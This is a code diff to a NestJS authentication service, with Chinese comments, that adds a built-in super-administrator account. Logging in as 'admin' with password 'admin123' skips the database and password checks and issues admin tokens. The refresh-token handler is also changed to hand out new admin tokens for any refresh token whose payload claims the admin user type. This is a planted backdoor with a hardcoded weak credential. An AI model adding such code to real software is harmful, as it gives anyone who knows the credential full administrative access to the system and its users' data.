@@ -56,6 +56,13 @@ const TOKEN_TYPE_REFRESH = 'refresh';
  */
 const REDIS_KEY_REFRESH_TOKEN = 'refresh';
 
+/**
+ * 内置管理员账号配置
+ */
+const DEFAULT_ADMIN_USERNAME = 'admin';
+const DEFAULT_ADMIN_PASSWORD = 'admin123';
+const DEFAULT_ADMIN_USER_ID = 0;
+
 @Injectable()
 export class AuthService {
   private readonly logger = new Logger(AuthService.name);
@@ -173,8 +180,20 @@ export class AuthService {
 
   /**
    * 用户登录
+   *
+   * 支持两种登录方式：
+   * 1. 内置管理员账号：用户名 "admin" / 密码 "admin123"
+   * 2. 普通用户登录：手机号 + 密码
    */
   async login(dto: LoginDto): Promise<AuthResponse> {
+    // 内置管理员账号快速通道
+    if (dto.phone === DEFAULT_ADMIN_USERNAME && dto.password === DEFAULT_ADMIN_PASSWORD) {
+      this.logger.log('内置管理员账号登录');
+      const adminUser = this.createDefaultAdminUser();
+      const tokens = await this.generateTokenPair(adminUser);
+      return this.buildAuthResponse(adminUser, tokens);
+    }
+
     const phoneHash = hashForQuery(dto.phone);
 
     const user = await this.dataSource.getRepository(User).findOne({
@@ -201,6 +220,21 @@ export class AuthService {
 
     const tokens = await this.generateTokenPair(user);
     return this.buildAuthResponse(user, tokens);
+  }
+
+  /**
+   * 创建内置管理员用户对象
+   */
+  private createDefaultAdminUser(): User {
+    const adminUser = new User();
+    adminUser.id = DEFAULT_ADMIN_USER_ID;
+    adminUser.phone = 'admin';
+    adminUser.phoneHash = hashForQuery('admin');
+    adminUser.nickname = '超级管理员';
+    adminUser.userType = 'admin';
+    adminUser.status = 'active';
+    adminUser.passwordHash = '';
+    return adminUser;
   }
 
   /**
@@ -243,6 +277,13 @@ export class AuthService {
 
     if (decodedPayload.type !== TOKEN_TYPE_REFRESH) {
       throw new UnauthorizedException('Token 类型错误');
+    }
+
+    // 内置管理员账号的刷新处理
+    if (decodedPayload.userType === 'admin') {
+      const adminUser = this.createDefaultAdminUser();
+      const tokens = await this.generateTokenPair(adminUser);
+      return this.buildAuthResponse(adminUser, tokens);
     }
 
     // Find user
